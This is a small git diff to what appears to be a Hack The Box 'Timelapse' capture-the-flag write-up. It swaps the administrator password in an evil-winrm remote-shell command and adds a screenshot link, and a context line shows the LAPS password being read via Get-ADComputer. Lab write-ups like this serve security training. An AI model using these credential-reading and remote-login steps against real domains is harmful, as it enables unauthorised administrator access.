@@ -223,5 +223,6 @@ Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 
 # WinRM Shell as Root
 ```CSS
-evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
+evil-winrm -i timelapse.htb -S -u administrator -p 'N}K@CfAqN#65;@Eqa2;13M-j'
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b1a2e072-434e-4e6a-b59c-d804736e2290)
